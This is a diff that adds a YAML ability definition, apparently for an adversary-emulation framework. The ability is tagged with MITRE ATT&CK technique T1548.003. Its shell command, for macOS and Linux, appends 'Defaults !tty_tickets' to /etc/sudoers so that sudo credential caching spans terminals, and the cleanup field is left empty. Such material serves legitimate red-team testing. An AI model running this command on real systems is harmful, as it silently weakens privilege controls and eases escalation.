@@ -1,0 +1,24 @@
+---
+- id: a154953a1f2c0f570e42e7ee73788df8
+  name: Disable tty_tickets for sudo caching
+  description: 'Sets sudo caching tty_tickets value to disabled. This is dangerous
+    to modify without using ''visudo'', do not do this on a production system.
+
+    '
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.003
+    name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching'
+  platforms:
+    darwin:
+      sh:
+        command: sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"; sudo
+          visudo -c -f /etc/sudoers
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"; sudo
+          visudo -c -f /etc/sudoers
+        payloads: []
+        cleanup: ''
